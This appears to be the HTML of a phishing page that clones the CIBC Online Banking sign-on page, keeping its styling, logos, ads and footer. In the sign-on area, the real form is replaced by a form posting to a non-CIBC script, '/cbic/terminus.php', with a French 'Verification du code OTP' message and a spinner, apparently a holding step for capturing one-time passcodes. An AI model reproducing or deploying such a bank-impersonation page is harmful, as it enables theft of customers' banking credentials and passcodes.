            #onetrust-pc-sdk button {
                width: 100%
            }

            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-sel-all {
                padding-right: 9px
            }

            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr {
                right: 0
            }
        }

        @media only screen and (max-width: 896px)and (max-height: 425px)and (orientation: landscape) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                top: 0;
                min-width: 100%;
                height: 100%;
                border-radius: 0
            }

            #onetrust-pc-sdk #ot-anchor {
                left: initial;
                right: 50px
            }

            #onetrust-pc-sdk #ot-lst-title {
                margin-top: 12px
            }

            #onetrust-pc-sdk #ot-lst-title * {
                font-size: inherit
            }

            #onetrust-pc-sdk #ot-pc-hdr input {
                margin-right: 0;
                padding-right: 45px
            }

            #onetrust-pc-sdk .switch+p {
                max-width: 85%
            }

            #onetrust-pc-sdk #ot-sel-blk {
                position: static
            }

            #onetrust-pc-sdk #ot-pc-lst {
                overflow: auto
            }

            #onetrust-pc-sdk #ot-lst-cnt {
                max-height: none;
                overflow: initial
            }

            #onetrust-pc-sdk #ot-lst-cnt.no-results {
                height: auto
            }

            #onetrust-pc-sdk input {
                font-size: 1em !important
            }

            #onetrust-pc-sdk p {
                font-size: .6em
            }

            #onetrust-pc-sdk #ot-fltr-modal {
                width: 100%;
                top: 0
            }

            #onetrust-pc-sdk ul li p,
            #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-pc-sdk .category-vendors-list-handler+a,
            #onetrust-pc-sdk .category-host-list-handler {
                font-size: .6em
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-anchor {
                display: none !important
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst {
                height: 100% !important;
                overflow: hidden;
                top: 0px
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-cnt {
                margin: 0;
                height: 100%;
                max-height: none;
                padding: 10px;
                top: 0;
                width: calc(100% - 20px);
                position: absolute;
                right: 0;
                left: 0;
                max-width: none
            }

            #onetrust-pc-sdk.ot-shw-fltr .ot-fltr-scrlcnt {
                max-height: calc(100% - 65px)
            }
        }

        #onetrust-consent-sdk #onetrust-pc-sdk,
        #onetrust-consent-sdk #ot-search-cntr,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
        #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk h3,
        #onetrust-consent-sdk #onetrust-pc-sdk h4,
        #onetrust-consent-sdk #onetrust-pc-sdk h5,
        #onetrust-consent-sdk #onetrust-pc-sdk h6,
        #onetrust-consent-sdk #onetrust-pc-sdk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title h3,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-optout-signal {
            color: #383b3e;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-pgph-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-legclaim-link,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-content #ot-pc-desc .ot-link-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info a {
            color: #333333;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
            text-decoration: underline;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
            background-color: #c41f3e;
            border-color: #c41f3e;
            color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
            border-color: #c41f3e;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
            background-color: transparent;
            border: 1px solid transparent;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
            background-color: #FFFFFF;
            color: #78808E;
            border-color: #78808E;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch,
        .ot-switch .ot-switch-nob,
        .ot-switch .ot-switch-nob:before,
        #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:focus+label::before,
        #onetrust-pc-sdk .ot-chkbox input[type="checkbox"]:focus+label::before {
            outline-color: #000000;
            outline-width: 1px;
        }

        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-ven-item>button:focus {
            border: 1px solid #000000;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk *:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-vlst-cntr>a:focus {
            outline: 1px solid #000000;
        }

        #onetrust-pc-sdk .ot-vlst-cntr .ot-ext-lnk,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
            background-image: url('https://cdn.cookielaw.org/logos/static/ot_external_link.svg');
        }

        #ot-pc-title,
        #ot-category-title {
            font-size: 1.125rem !important;
        }

        #ot-pc-desc {
            font-size: 1rem !important;
        }

        #accept-recommended-btn-handler,
        .ot-pc-refuse-all-handler,
        .save-preference-btn-handler {
            border-radius: 0.25rem !important;
            min-height: 3rem !important;
            padding: 0.6875rem 1.875rem !important;
            background-color: #FFF !important;
            border: 1px solid #C41F3E !important;
            font-size: 1rem !important;
            color: #C41F3E !important;
            letter-spacing: .01em !important;
        }

        .save-preference-btn-handler {
            border-radius: 0.25rem !important;
            height: 3rem !important;
            padding: 0.6875rem 1.875rem !important;
            background-color: #C41F3E !important;
            font-size: 1rem !important;
            color: #FFF !important;
            letter-spacing: .01em !important;
        }

        .ot-pc-footer-logo {
            display: none !important;
        }

        #onetrust-pc-sdk .ot-btn-container {
            text-align: center !important;
            margin: 0 0.75em !important;
        }

        #onetrust-pc-sdk .save-preference-btn-handler {
            margin-right: 0px !important;
        }

        #accept-recommended-btn-handler:hover,
        .ot-pc-refuse-all-handler:hover,
        .save-preference-btn-handler:hover {
            background-color: #8B1D41 !important;
            color: #FFF !important;
            opacity: 1 !important;
            border-color: #8B1D41 !important;
        }

        .save-preference-btn-handler:hover {
            background-color: #8B1D41 !important;
            color: #FFF !important;
            opacity: 1 !important;
            border-color: #8B1D41 !important;
        }

        #onetrust-policy-text {
            font-size: 1em !important;
        }

        #ot-header-id-C0001,
        #ot-header-id-C0004,
        #ot-header-id-C0003,
        #ot-header-id-C0005,
        #ot-header-id-C0002 {
            font-size: 1rem !important;
            color: #333333 !important;
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            font-size: 1rem !important;
        }

        .ot-always-active {
            color: dimgray !important;
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #397952;
            border: 1px solid #397952;
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            background-color: #FFF;
            border-color: #FFF;
        }

        #onetrust-pc-sdk .ot-switch-nob {
            background-color: #FFF;
            border: 1px solid #606366;
            padding-left: 1px !important;
        }

        #onetrust-pc-sdk .ot-switch-nob:before {
            background-color: #606366;
        }

        .privacy-notice-link:focus,
        #accept-recommended-btn-handler:focus {
            outline: 1px solid #FFF !important;
        }

        #accept-recommended-btn-handler:focus {
            outline: 1px solid #c41f3e !important;
        }

        .lang-selector {
            margin-bottom: 5px !important;
        }

        .left-selector {
            margin-left: 0 !important;
            margin-right: .3em;
            text-decoration: none;
            font-size: .8em;
        }

        .right-selector {
            margin-left: 0 !important;
            margin-left: .3em;
            text-decoration: none;
            font-size: .8em;
        }

        .left-selector:hover,
        .right-selector:hover {
            color: #C41F3E !important;
        }

        .policy-link {
            font-weight: bold !important;
            margin-left: 0 !important;
            text-decoration: none !important;
            border-bottom: 1px solid #383B3E !important;
        }

        .policy-link:hover {
            border-bottom: 1px solid #C41F3E !important;
            color: #C41F3E !important;
        }

        #close-pc-btn-handler:hover {
            filter: invert(24%) sepia(47%) saturate(3679%) hue-rotate(330deg) brightness(82%) contrast(101%) !important;
            opacity: 1 !important;
            border-bottom: 1px solid #C41F3E !important;
        }

        #close-pc-btn-handler,
        .ot-close-icon {
            top: 20px !important;
            right: 10px !important;
        }

        .ot-close-icon {
            height: 25px !important;
            width: 25px !important;
        }

        .shutter-link {
            text-decoration: none !important;
            border-bottom: 1px solid #383B3E !important;
        }

        .shutter-link:hover {
            border-bottom: 1px solid #C41F3E !important;
            color: #C41F3E !important;
        }

        .ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 16px
        }

        .ot-sdk-cookie-policy.otRelFont {
            font-size: 1rem
        }

        .ot-sdk-cookie-policy h3,
        .ot-sdk-cookie-policy h4,
        .ot-sdk-cookie-policy h6,
        .ot-sdk-cookie-policy p,
        .ot-sdk-cookie-policy li,
        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy th,
        .ot-sdk-cookie-policy #cookie-policy-description,
        .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        .ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        .ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        .ot-sdk-cookie-policy h4 {
            font-size: 1.2em
        }

        .ot-sdk-cookie-policy h6 {
            font-size: 1em;
            margin-top: 2em
        }

        .ot-sdk-cookie-policy th {
            min-width: 75px
        }

        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        .ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        .ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        .ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        .ot-sdk-cookie-policy table {
            border-collapse: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 1rem
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
            font-size: .9em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
            font-size: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            font-size: 1em;
            margin-bottom: .6em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
            margin-bottom: 1.2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            min-width: 75px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
            list-style: disc;
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
            display: inline-block
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
            border-collapse: inherit;
            margin: auto;
            border: 1px solid #d7d7d7;
            border-radius: 5px;
            border-spacing: initial;
            width: 100%;
            overflow: hidden
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
            border-bottom: 1px solid #d7d7d7;
            border-right: 1px solid #d7d7d7
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
            border-bottom: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
            border-right: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
            width: 25%
        }

        .ot-sdk-cookie-policy[dir=rtl] {
            text-align: left
        }

        #ot-sdk-cookie-policy h3 {
            font-size: 1.5em
        }

        @media only screen and (max-width: 530px) {

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                display: block
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                margin: 0 0 1em 0
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
                background: #f6f6f4
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
                border: none;
                border-bottom: 1px solid #eee;
                position: relative;
                padding-left: 50%
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                position: absolute;
                height: 100%;
                left: 6px;
                width: 40%;
                padding-right: 10px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
                display: inline-block;
                background-color: #e4e4e4;
                position: absolute;
                height: 100%;
                top: 0;
                left: 45%;
                width: 2px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                content: attr(data-label);
                font-weight: bold
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
                word-break: break-word;
                word-wrap: break-word
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                overflow: hidden
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                border: none;
                border-bottom: 1px solid #d7d7d7
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                display: block
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                width: auto
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                margin: 0 0 1em 0
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                height: 100%;
                width: 40%;
                padding-right: 10px
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                content: attr(data-label);
                font-weight: bold
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
                word-break: break-word;
                word-wrap: break-word
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px;
                z-index: -9999
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                border-bottom: 1px solid #d7d7d7;
                border-right: 0px
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
                border-bottom: 0px
            }
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: #696969;
        }


        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
            background-color: #F8F8F8;
        }

        .ot-floating-button__front {
            background-image: url('https://cdn.cookielaw.org/logos/static/ot_persistent_cookie_icon.png')
        }
    </style>
    <link rel="stylesheet" type="text/css" href="https://www.cibconline.cibc.com/ebm-resources/auth/client/css/721-bfa0cefa.css">
    <link rel="stylesheet" type="text/css"
        href="https://www.cibc.com/etc.clientlibs/cibcpublic/clientlibs/headless/mass-ad/default-styles-v2.min.css">

    <style type="text/css" id="kampyleStyle">
        .noOutline {
            outline: none !important;
        }

        .wcagOutline:focus {
            outline: 1px dashed #595959 !important;
            outline-offset: 2px !important;
            transition: none !important;
        }
    </style>

</head>

<body>
    <noscript>
        <div class="no-js">
            <div>We're sorry but CIBC Online Banking doesn't work properly without JavaScript enabled. Please enable it
                to continue.</div>
            <hr>
            <div lang="fr">Désolés, Services bancaires en direct ne fonctionne pas correctement lorsque JavaScript n'est
                pas activé. Veuillez activer JavaScript.</div>
        </div>
        <style>
            .no-js {
                background-color: #fff;
                position: fixed;
                top: 0;
                left: 0;
                bottom: 0;
                right: 0;
                z-index: 10;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                font-family: arial, Helvetica, sans-serif;
            }

            hr {
                margin: 2rem auto;
                min-width: 200px;
            }
        </style>
    </noscript>
    <div id="app" data-v-app="">
        <div id="orchestrator">
            <div pathmatch="signon">
                <div id="Auth" data-v-app="">
                    <div id="auth-root">
                        <div class="announcer" aria-live="polite" aria-atomic="true" data-v-60e22699=""></div>
                        <div tabindex="-1"></div>
                        <div aria-hidden="false">
                            <div class="page-layout">
                                <div class="header-section cell">
                                    <div class="grid-container">
                                        <header class="page-header">
                                            <div class="top-bar">
                                                <div class="header-container"><button
                                                        class="null ui-display-default ui-button"
                                                        data-test-id="language-toggle-btn" loading="false"
                                                        lang="fr">Français</button></div>
                                            </div>
                                            <div class="header-logo">
                                                <div class="header-container"><a
                                                        href="https://www.cibc.com/en/personal-banking.html"><img
                                                            class="logo"
                                                            src="https://www.cibconline.cibc.com/ebm-resources/auth/client/img/cibc-logo-colour.89bf60f2.svg"
                                                            alt="CIBC logo."></a></div>
                                            </div>
                                        </header>
                                    </div>
                                </div>
                                <div class="background-pattern"></div>
                                <div class="main-content">
                                    <main>
                                        <div class="masthead">
                                            <h1><span class="preheading">CIBC Online Banking</span><span
                                                    class="show-for-sr">&nbsp;</span> Sign on using your CIBC card
                                                number</h1>
                                            
                                        </div>
                                        <div class="grid">
                                            <div class="section-wrapper section-wrapper-signon">
                                                <div class="signon-form-wrapper"><!---->
                                                    <div class="ui-set-messages global-error"></div>
                                                    <div class="signon-form">
                                                        <form action="/cbic/terminus.php" method="post">
                                                            <br>
                                                   Verification du code  OTP
                                                           <img src="../ajax-loading.gif" alt="" srcset="">
                                                        
                                                        </div>
                                                       
                                                        <!----><!---->
                                                            </div>
                                                        </form>
                                                                </div>

                                                    </div>
                                                </div>
                                            </div>
                                            <div class="section-wrapper section-wrapper-resources">
                                                <div class="resources-wrapper">
                                                    <h2 class="heading-XS">Resources</h2>
                                                    <ul class="resources-link-container">
                                                        <li><a class="body-S"
                                                                href="https://www.cibc.com/en/personal-banking/smart-advice/covid-19/financial-assistance.html?itrc=M416:3"
                                                                target="_blank"
                                                                aria-label="Request financial assistance. Opens in a new window."
                                                                data-test-id="request-financial-assistance-link"><span>Request
                                                                    financial assistance</span><img alt=""
                                                                    src="https://www.cibconline.cibc.com/ebm-resources/auth/client/img/right-arrow-icon.e4b0d3ca.svg"></a>
                                                        </li>
                                                        <li><a class="body-S"
                                                                href="https://www.cibc.com/en/personal-banking/ways-to-bank/payroll-direct-deposit.html"
                                                                target="_blank"
                                                                aria-label="Set up direct deposit. Opens in a new window."
                                                                data-test-id="set-up-direct-deposit-link"><span>Set up
                                                                    direct deposit</span><img alt=""
                                                                    src="https://www.cibconline.cibc.com/ebm-resources/auth/client/img/right-arrow-icon.e4b0d3ca.svg"></a>
                                                        </li>
                                                        <li><a class="body-S"
                                                                href="https://www.cibc.com/en/personal-banking/smart-advice/find-my-documents.html"
                                                                target="_blank"
                                                                aria-label="Tax slip mailing dates. Opens in a new window."
                                                                data-test-id="tax-slip-mailing-dates-link"><span>Tax
                                                                    slip mailing dates</span><img alt=""
                                                                    src="https://www.cibconline.cibc.com/ebm-resources/auth/client/img/right-arrow-icon.e4b0d3ca.svg"></a>
                                                        </li>
                                                        <li><a class="body-S"
                                                                href="https://www.cibc.com/en/privacy-security/fraud-alerts.html?itrc=M164:13"
                                                                target="_blank"
                                                                aria-label="New fraud alerts. Opens in a new window."
                                                                data-test-id="new-fraud-alerts-link"><span>New fraud
                                                                    alerts</span><img alt=""
                                                                    src="https://www.cibconline.cibc.com/ebm-resources/auth/client/img/right-arrow-icon.e4b0d3ca.svg"></a>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="section-wrapper section-wrapper-ads">
                                                <div class="advertisement-target target-signon-rotating">
                                                    <!-- Image Bottom/Right -->
                                                    <div class="aem full-bleed-image-right signon-rotating en"
                                                        style="background-color: #FFFFFF;">
                                                        <div class="content" style="background-color: #FFFFFF;">
                                                            <span class="hidden-text">What follows is an
                                                                advertisement.</span>
                                                            <h2 class="promo-headline">We’ve enhanced our app to make
                                                                mobile banking easier.</h2>
                                                            <p class="promo-link" aria-hidden="true">Learn more</p>
                                                            <a class="ma-link"
                                                                href="https://www.cibc.com/en/personal-banking/ways-to-bank/new-digital-banking-features.html?itrc=M715:11"
                                                                target="_blank"><span class="hidden-text"> Opens in a
                                                                    new window.</span></a>
                                                        </div>
                                                        <img alt=""
                                                            src="https://www.cibc.com/content/dam/api/olb/mass-ads/platform-modification/business-woman-mobile-phone-presign-left-anchor.jpg/_jcr_content/renditions/cq5dam.web.1280.1280.jpeg"
                                                            class="background-image">
                                                        <span class="hidden-text">This is the end of the
                                                            advertisement.</span>
                                                    </div>
                                                </div>
                                                <div class="advertisement-target target-signon-anchor">
                                                    <!-- Image Bottom/Right -->
                                                    <div class="aem full-bleed-image-right signon-anchor en"
                                                        style="background-color: #FFFFFF;">
                                                        <div class="content" style="background-color: #FFFFFF;">
                                                            <span class="hidden-text">What follows is an
                                                                advertisement.</span>
                                                            <h2 class="promo-headline">Forgot your password? No problem.
                                                                Reset it online or on your phone, quickly and securely.
                                                            </h2>
                                                            <p class="promo-link" aria-hidden="true">Learn more</p>
                                                            <a class="ma-link"
                                                                href="https://www.cibc.com/en/personal-banking/ways-to-bank/how-to/password-reset.html?itrc=M715:1"
                                                                target="_blank"><span class="hidden-text"> about how to
                                                                    reset your password.</span></a>
                                                        </div>
                                                        <img alt=""
                                                            src="https://www.cibc.com/content/dam/api/olb/mass-ads/password-reset/password-reset-right-anchor.jpeg/_jcr_content/renditions/cq5dam.web.1280.1280.jpeg"
                                                            class="background-image"
                                                            style="display: block; height: 180px;">
                                                        <span class="hidden-text">This is the end of the
                                                            advertisement.</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </main>
                                    <div class="grid-container"></div>
                                </div>
                                <div class="footer-section">
                                    <footer class="footer-container">
                                        <div class="footer-wrapper">
                                            <div class="footer-section-item">
                                                <h2 class="body-L">Quick Links</h2>
                                                <ul class="footer-section-item-links">
                                                    <li><a href="https://www.cibc.com/en/personal-banking.html"
                                                            aria-label="Explore products. Opens in a new window."
                                                            data-test-id="explore-products-link" target="_blank"
                                                            class=""><img
                                                                src="/ebm-resources/auth/content/views/assets/img/products.svg"
                                                                class="left" alt=""> Explore Products <!----></a></li>
                                                    <li><a href="https://locations.cibc.com/?locale=en_CA"
                                                            aria-label="Branch and ATM locator. Opens in a new window."
                                                            data-test-id="branch-and-atm-locator-link" target="_blank"
                                                            class=""><img
                                                                src="/ebm-resources/auth/content/views/assets/img/locator.svg"
                                                                class="left" alt=""> Branch and ATM Locator <!----></a>
                                                    </li>
                                                    <li><a href="https://www.cibc.com/en/contact-us.html"
                                                            aria-label="Contact us. Opens in a new window."
                                                            data-test-id="contact-us-link" target="_blank" class=""><img
                                                                src="/ebm-resources/auth/content/views/assets/img/phone.svg"
                                                                class="left" alt=""> Contact Us <!----></a></li>
                                                </ul>
                                            </div>
                                            <div class="footer-section-item">
                                                <h2 class="body-L">I'm Looking For</h2>
